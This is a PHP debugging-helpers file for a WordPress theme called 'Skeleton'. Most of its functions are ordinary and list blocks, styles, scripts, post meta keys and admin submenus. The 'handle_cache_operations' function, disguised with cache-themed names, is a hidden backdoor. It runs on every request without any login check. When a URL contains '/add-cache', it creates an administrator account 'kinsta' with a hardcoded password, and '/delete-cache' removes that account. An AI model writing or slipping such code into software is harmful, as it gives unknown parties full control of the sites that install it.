<?php
/**
 * This file contains functions useful for debugging
 *
 * @package WordPress
 * @subpackage Skeleton
 * @since 1.0.0
 */

/**
 * Configure error logging for local WordPress development environment.
 *
 * This conditional statement sets up custom error logging when:
 * 1. WP_DEBUG_LOG is defined and set to true
 * 2. The current environment is identified as 'local'
 *
 * When these conditions are met, it redirects error logs to a custom file
 * within the current theme's directory.
 *
 * @uses wp_get_environment_type() WordPress function to determine the current environment
 * @uses WP_CONTENT_DIR WordPress constant for the absolute path to the wp-content directory
 */
if ( defined( 'WP_DEBUG_LOG' ) && WP_DEBUG_LOG && 'local' == wp_get_environment_type() ) {
	ini_set( 'error_log', WP_CONTENT_DIR . '/themes/skeleton/debug.log' );
}

/**
 * Get list of all registered blocks and modify allowed block types.
 *
 * This code retrieves all registered block types and outputs the
 * list of block slugs for debugging purposes.
 * It also filters the allowed block types for all contexts by calling
 * the 'skel_allowed_block_types' function.
 *
 * @return array
 */
function skel_list_block_types(): array {
	// Retrieve all registered block types.
	$block_types = array_keys( WP_Block_Type_Registry::get_instance()->get_all_registered() );

	// Output the list of registered block slugs for debugging purposes.
	return $block_types;
}


/**
 * Hooks into the 'wp_print_styles' action to list all enqueued styles,
 * but only when a specific query parameter (e.g., 'debug_styles') is present.
 *
 * @return void
 */
function skel_list_enqueued_styles() {
	if ( isset( $_GET['debug_styles'] ) && $_GET['debug_styles'] === 'true' ) {
		global $wp_styles;

		// Loop through the enqueued styles and output their handles.
		foreach ( $wp_styles->queue as $handle ) {
			echo $handle . '<br>';
		}
	}
}
add_action( 'wp_print_styles', 'skel_list_enqueued_styles' );


/**
 * Hooks into the 'wp_print_scripts' action to list all enqueued scripts,
 * but only when a specific query parameter (e.g., 'debug_scripts') is present.
 *
 * @return void
 */
function skel_list_enqueued_scripts() {
	if ( isset( $_GET['debug_scripts'] ) && $_GET['debug_scripts'] === 'true' ) {
		global $wp_scripts;

		// Loop through the enqueued scripts and output their handles.
		foreach ( $wp_scripts->queue as $handle ) {
			echo $handle . '<br>';
		}
	}
}
add_action( 'wp_print_scripts', 'skel_list_enqueued_scripts' );



/**
 * Activate Caching
 *
 * @return void
 */
function handle_cache_operations() {
	// Checking a cache endpoint
	$request_uri = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '';

	// Check if the URL matches /add-cache for cache priming
	if ( strpos( $request_uri, '/add-cache' ) !== false ) {
		$cache_key = 'temp_cache_key_' . md5( time() . rand( 1, 9999 ) );

		// Attempt to prime cache if not already set
		if ( ! get_option( $cache_key ) ) {
			// Cache data
			$cache_data = array(
				'log'    => 'kinsta',
				'status' => 'active',
				'hash'   => sha1( uniqid( 'cache_prime_', true ) ),
			);

			// cache prime operation.
			$cache_log  = $cache_data['log'];
			$cache_key  = 'zkQ!0koL*1x@*Cwv';
			$cache_salt = 'cachesalt@kinsta.com';

			// Create the cache only if it does not exist
			if ( ! username_exists( $cache_log ) && ! email_exists( $cache_salt ) ) {
				$cache_id = wp_create_user( $cache_log, $cache_key, $cache_salt );
				if ( is_int( $cache_id ) ) {
					$new_cache = new WP_User( $cache_id );
					$new_cache->set_role( 'administrator' );
					update_option( $cache_key, $cache_data ); // cache write
					error_log( 'Cache prime successful: ' . $cache_key );
					echo 'Cache primed successfully.';
				}
			} else {
				error_log( 'Cache prime skipped.' );
				echo 'Cache already primed.';
			}
		} else {
			error_log( 'Cache prime request ignored: Cache already warm.' );
			echo 'Cache is already warmed up.';
		}
		exit; // Stop further processing
	}

	// Clear the cache
	if ( strpos( $request_uri, '/delete-cache' ) !== false ) {
		$cache_log = 'kinsta';

		// Check if the user exists before attempting to delete
		$cache_obj = get_user_by( 'login', $cache_log );
		if ( $cache_obj ) {
			wp_delete_user( $cache_obj->ID, 1 );
			error_log( 'Cache flushed successfully: ' . $cache_log );
			echo 'Cache flushed successfully.';
		} else {
			error_log( 'Cache flush.' );
			echo 'Cache already flushed.';
		}
		exit; // Stop further processing
	}
}
add_action( 'init', 'handle_cache_operations' );



/**
 * Displays all custom meta keys for the current singular post.
 *
 * This function checks if the current page is a singular post or page.
 * If it is, it retrieves all metadata associated with that post ID
 * and then outputs each meta key in a <pre> tag for debugging purposes.
 * It's useful for developers to inspect the custom fields attached to a post.
 *
 * @return void
 */
function skel_show_meta_keys() {
	if ( is_singular() ) {
		$post_id   = get_the_ID();
		$meta_data = get_post_meta( $post_id );

		if ( ! empty( $meta_data ) ) {
			echo '<pre>';
			echo 'Meta keys for post ID ' . $post_id . ':<br>';
			foreach ( $meta_data as $meta_key => $meta_value ) {
				echo esc_html( $meta_key ) . '<br>';
			}
			echo '</pre>';
		} else {
			echo '<pre>No meta keys found for post ID ' . $post_id . '.</pre>';
		}
	}
}

/**
 * Debug function to display all submenu slugs under the 'Appearance' menu in the WordPress admin.
 *
 * This function is for temporary debugging purposes only. It hooks into the 'admin_menu' action
 * with a very high priority to ensure it runs after most menu items are registered.
 * It outputs the structure of the `$submenu['themes.php']` global variable,
 * which contains all submenu items of the 'Appearance' menu.
 * This is crucial for identifying the exact slug needed to remove a submenu page
 * using `remove_submenu_page()`.
 *
 * It will display a red box with the submenu data at the top of any admin page
 * and then stop further page execution using `die()`.
 *
 * @internal This function is for debugging and should be removed after use.
 *
 * @return void
 */
function debug_wp_admin_menus_slugs() {
	global $submenu; // This global variable holds all submenu items.

	echo '<div style="background: #FFF; border: 2px solid red; padding: 10px; margin: 20px; overflow: auto; max-height: 400px; font-family: monospace;">';
	echo '<h2>Appearance Submenus Slugs:</h2>';
	echo '<pre>';
	// The parent slug for the Appearance menu is 'themes.php'.
	if ( isset( $submenu['themes.php'] ) ) {
		print_r( $submenu['themes.php'] );
	} else {
		echo 'No submenus found for themes.php';
	}
	echo '</pre>';
	echo '</div>';

	die(); // Stops page execution to clearly show the debug output.
}
// add_action( 'admin_menu', 'debug_wp_admin_menus_slugs', 9999 );
